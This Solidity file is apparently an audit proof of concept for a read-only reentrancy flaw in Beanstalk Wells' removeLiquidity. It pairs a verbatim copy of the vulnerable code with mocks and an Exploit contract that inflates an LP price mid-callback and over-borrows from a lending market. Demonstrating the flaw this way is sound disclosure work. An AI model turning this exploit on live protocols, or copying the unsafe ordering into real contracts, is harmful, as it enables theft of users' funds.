// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*//////////////////////////////////////////////////////////////////////////
    Beanstalk Wells (Basin) — Read-only reentrancy in Well.removeLiquidity
    Finding 18434 (Cyfrin, Hans) — HIGH

    Root cause: Well.removeLiquidity does NOT follow Checks-Effects-Interactions.
    It burns the caller's LP up front, then transfers the underlying tokens out,
    and commits the new reserves to storage (`_setReserves`) ONLY AFTER all the
    transfers have completed. `getReserves()` is a plain view with no reentrancy
    guard, so a token with a transfer callback (ERC-777-style) can, mid-transfer,
    re-enter read-only: `totalSupply()` has already dropped (the burn) while
    `getReserves()` still returns the FULL pre-op reserves. Any third-party price
    oracle that values the Well's LP via reserves/totalSupply during this window
    reads an inflated "virtual price" — the exact Curve-LP-oracle-manipulation
    class the finding cites.

    This file is a self-contained, cheatcode-free reduction. Well.removeLiquidity
    is copied VERBATIM from BeanstalkFarms/Wells@e5441fc src/Well.sol (L440-463),
    including the trailing `_setReserves` (the CEI violation). A LendingMock prices
    the Well's LP token off `getReserves()/totalSupply()` and lets a borrower draw
    against it — so the read-only-reentrancy mispricing becomes a real, token-
    denominated loss (the lender pool over-lends 2x and is left under-collateralized).
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IReserveConsumer {
    function onTokenTransfer(address from, address to, uint256 amount) external;
}

/// @dev Plain ERC20 (no transfer callback) — used for token1 and the loan token.
contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev ERC-777-style token: on transfer to a registered contract, it invokes a
///      callback AFTER updating balances — the reentry hook Wells warned about
///      ("Wells with ERC-777 tokens ... have a callback that can take control").
contract CallbackToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public callbackTarget;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function setCallback(address t) external {
        callbackTarget = t;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        if (to == callbackTarget && callbackTarget != address(0)) {
            IReserveConsumer(to).onTokenTransfer(msg.sender, to, amt);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        if (to == callbackTarget && callbackTarget != address(0)) {
            IReserveConsumer(to).onTokenTransfer(from, to, amt);
        }
        return true;
    }
}

/// @notice Reduced Well. The Well IS the LP token (constant-sum accounting for
///         setup). The vulnerable `removeLiquidity` body is verbatim from
///         BeanstalkFarms/Wells commit e5441fc, src/Well.sol L440-463.
contract Well is IERC20 {
    // --- LP token (ERC20) accounting ---
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    // --- reserves (stored; committed via _setReserves) ---
    uint256[] private _reserves;

    IERC20[] private _tokensArr;
    bool private _entered; // nonReentrant lock (does NOT protect the getReserves view)

    error SlippageOut(uint256 amountOut, uint256 minAmountOut);
    error InvalidReserves();

    event RemoveLiquidity(uint256 lpAmountIn, uint256[] tokenAmountsOut, address recipient);
    event AddLiquidity(uint256[] tokenAmountsIn, uint256 lpAmountOut, address recipient);

    modifier nonReentrant() {
        require(!_entered, "REENTRANCY");
        _entered = true;
        _;
        _entered = false;
    }

    constructor(IERC20 token0, IERC20 token1) {
        _tokensArr.push(token0);
        _tokensArr.push(token1);
        _reserves.push(0);
        _reserves.push(0);
    }

    // --- LP ERC20 transfer (plain; no reentrancy guard, as in a real ERC20) ---
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function _mint(address to, uint256 amt) internal {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function _burn(address from, uint256 amt) internal {
        totalSupply -= amt;
        balanceOf[from] -= amt;
    }

    function tokens() public view returns (IERC20[] memory ts) {
        ts = _tokensArr;
    }

    // --- reserves views ---
    function getReserves() external view returns (uint256[] memory reserves) {
        // NOTE: plain view, NO reentrancy guard -> reachable during a transfer
        // callback while removeLiquidity is mid-flight (reserves not yet committed).
        reserves = _reserves;
    }

    /// @dev Price a Well LP unit the way a naive integrating oracle would:
    ///      total reserve value (1:1 tokens) per outstanding LP token.
    function virtualPrice() external view returns (uint256) {
        if (totalSupply == 0) return 0;
        return (_reserves[0] + _reserves[1]) * 1e18 / totalSupply;
    }

    function _getReserves(uint256 n) internal view returns (uint256[] memory reserves) {
        reserves = new uint256[](n);
        for (uint256 i; i < n; ++i) reserves[i] = _reserves[i];
    }

    function _setReserves(IERC20[] memory _tokens, uint256[] memory reserves) internal {
        for (uint256 i; i < reserves.length; ++i) {
            if (reserves[i] > _tokens[i].balanceOf(address(this))) revert InvalidReserves();
        }
        for (uint256 i; i < reserves.length; ++i) _reserves[i] = reserves[i];
    }

    function _updatePumps(uint256 n) internal view returns (uint256[] memory reserves) {
        // No pumps in this reduction; behaves as reserve read.
        reserves = _getReserves(n);
    }

    // --- add liquidity (constant-sum setup path; not the vulnerable code) ---
    function addLiquidity(
        uint256[] memory tokenAmountsIn,
        uint256 minLpAmountOut,
        address recipient
    ) external nonReentrant returns (uint256 lpAmountOut) {
        IERC20[] memory _tokens = tokens();
        uint256[] memory reserves = _updatePumps(_tokens.length);
        for (uint256 i; i < _tokens.length; ++i) {
            _tokens[i].transferFrom(msg.sender, address(this), tokenAmountsIn[i]);
            reserves[i] = reserves[i] + tokenAmountsIn[i];
        }
        // constant-sum LP: supply == sum of reserves -> virtual price starts at 1.0
        lpAmountOut = (reserves[0] + reserves[1]) - totalSupply;
        require(lpAmountOut >= minLpAmountOut, "slippage");
        _mint(recipient, lpAmountOut);
        _setReserves(_tokens, reserves);
        emit AddLiquidity(tokenAmountsIn, lpAmountOut, recipient);
    }

    //////////////////// REMOVE LIQUIDITY: BALANCED ////////////////////
    // VERBATIM from BeanstalkFarms/Wells@e5441fc src/Well.sol L440-463.
    // The CEI violation: tokens are transferred out (firing the ERC-777 callback)
    // BEFORE `_setReserves` commits the decremented reserves to storage.

    function removeLiquidity(
        uint256 lpAmountIn,
        uint256[] calldata minTokenAmountsOut,
        address recipient,
        uint256 /*deadline*/
    ) external nonReentrant returns (uint256[] memory tokenAmountsOut) {
        IERC20[] memory _tokens = tokens();
        uint256[] memory reserves = _updatePumps(_tokens.length);
        uint256 lpTokenSupply = totalSupply;

        tokenAmountsOut = new uint256[](_tokens.length);
        _burn(msg.sender, lpAmountIn);
        for (uint256 i; i < _tokens.length; ++i) {
            tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
            if (tokenAmountsOut[i] < minTokenAmountsOut[i]) {
                revert SlippageOut(tokenAmountsOut[i], minTokenAmountsOut[i]);
            }
            _tokens[i].transfer(recipient, tokenAmountsOut[i]); // @> VULN: interaction (transfer + ERC-777 callback) fires while reserves are still stale in storage
            reserves[i] = reserves[i] - tokenAmountsOut[i];
        }

        _setReserves(_tokens, reserves); // reserves committed ONLY here, AFTER every transfer -> getReserves() read stale during the callback
        emit RemoveLiquidity(lpAmountIn, tokenAmountsOut, recipient);
    }
}

/// @notice A third-party lending market that (naively) values the Well's LP token
///         via the Well's own on-chain price. This is the "third-party protocol
///         that integrates these on-chain oracles" the finding says is at risk.
contract LendingMock {
    Well public well;
    IERC20 public loanToken;
    mapping(address => uint256) public collateral; // LP posted
    mapping(address => uint256) public debt; // loanToken owed

    constructor(Well _well, IERC20 _loanToken) {
        well = _well;
        loanToken = _loanToken;
    }

    /// @dev value of `user`'s LP collateral, priced at the Well's CURRENT virtual price.
    function collateralValue(address user) public view returns (uint256) {
        return collateral[user] * well.virtualPrice() / 1e18;
    }

    function depositCollateral(uint256 lp) external {
        well.transferFrom(msg.sender, address(this), lp);
        collateral[msg.sender] += lp;
    }

    /// @dev borrow up to the (price-dependent) value of posted collateral.
    function borrow(uint256 amount) external {
        require(debt[msg.sender] + amount <= collateralValue(msg.sender), "undercollateralized");
        debt[msg.sender] += amount;
        loanToken.transfer(msg.sender, amount);
    }
}

/// @notice Orchestrates the read-only-reentrancy price manipulation and drain.
///         Sole LP + borrower + reentry callback recipient.
contract Exploit is IReserveConsumer {
    uint256 public constant LIQ = 100e18; // per-side reserve
    uint256 public constant COLLATERAL_LP = 100e18; // LP kept as loan collateral

    CallbackToken public token0;
    MockToken public token1;
    MockToken public loanToken;
    Well public well;
    LendingMock public lending;
    address public attacker;

    // observations captured for the harm assertion
    uint256 public fairPriceBefore;
    uint256 public priceDuringCallback;
    uint256 public priceAfter;
    uint256 public borrowedInCallback;
    bool private borrowedOnce;

    constructor() {
        attacker = msg.sender;
        token0 = new CallbackToken(); // CREATE nonce 1
        token1 = new MockToken(); // CREATE nonce 2
        loanToken = new MockToken(); // CREATE nonce 3
        well = new Well(IERC20(address(token0)), IERC20(address(token1))); // CREATE nonce 4
        lending = new LendingMock(well, IERC20(address(loanToken))); // CREATE nonce 5

        // Fund the lending market with borrowable liquidity.
        loanToken.mint(address(lending), 1000e18);

        // Seed the Well with 100/100 and take ALL the LP (200e18) as sole LP.
        token0.mint(address(this), LIQ);
        token1.mint(address(this), LIQ);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        uint256[] memory amountsIn = new uint256[](2);
        amountsIn[0] = LIQ;
        amountsIn[1] = LIQ;
        well.addLiquidity(amountsIn, 0, address(this)); // -> 200e18 LP, reserves (100,100), price 1.0
    }

    function run() external {
        // Baseline: fair virtual price with reserves and supply in sync.
        fairPriceBefore = well.virtualPrice(); // 1e18

        // Post COLLATERAL_LP of LP into the lending market at the FAIR price.
        well.approve(address(lending), type(uint256).max);
        lending.depositCollateral(COLLATERAL_LP);

        // Register this contract to receive the ERC-777 callback from token0.
        token0.setCallback(address(this));

        // Remove the OTHER 100e18 LP. The token0 transfer to us fires
        // onTokenTransfer WHILE reserves are still stale (read-only reentrancy).
        uint256[] memory minOut = new uint256[](2);
        well.removeLiquidity(well.balanceOf(address(this)), minOut, address(this), type(uint256).max);

        // Reserves are now committed; price is back to fair.
        priceAfter = well.virtualPrice(); // 1e18

        // ---- HARM ASSERTIONS ----
        // 1. Read-only reentrancy exposed an inflated price: during the callback,
        //    reserves were the full pre-op (100+100) while totalSupply had already
        //    been reduced by the burn -> 2x the true price.
        require(fairPriceBefore == 1e18, "baseline price != 1.0");
        require(priceAfter == 1e18, "post price != 1.0");
        require(priceDuringCallback == 2 * priceAfter, "read-only reentrancy did not inflate price 2x");

        // 2. The lending market let us borrow against that inflated valuation:
        //    100e18 LP priced at 2.0 -> 200e18 loanToken drawn, vs 100e18 fair.
        require(borrowedInCallback == 200e18, "did not over-borrow at inflated price");
        require(loanToken.balanceOf(attacker) == 200e18, "attacker did not receive over-borrow");

        // 3. The lending pool is now under-collateralized: it paid out 200e18
        //    against collateral truly worth 100e18 -> 100e18 unbacked loss.
        uint256 fairCollateralNow = lending.collateralValue(address(this)); // 100e18
        require(fairCollateralNow == 100e18, "fair collateral value unexpected");
        require(lending.debt(address(this)) == 200e18, "debt booked wrong");
        require(lending.debt(address(this)) - fairCollateralNow == 100e18, "pool not short by 100e18");
    }

    /// @dev read-only reentrancy hook: observe & exploit the stale price.
    function onTokenTransfer(address, address, uint256) external override {
        if (msg.sender != address(token0)) return;
        if (borrowedOnce) return;
        borrowedOnce = true;

        // getReserves() still returns the full pre-op reserves, but totalSupply
        // has already been decremented by the burn -> inflated virtual price.
        priceDuringCallback = well.virtualPrice();

        // Borrow the maximum the lending market now (mis)prices our collateral at,
        // forwarding the proceeds to the attacker EOA.
        uint256 maxBorrow = lending.collateralValue(address(this)); // 100e18 * 2.0 = 200e18
        borrowedInCallback = maxBorrow;
        lending.borrow(maxBorrow);
        loanToken.transfer(attacker, maxBorrow);
    }
}
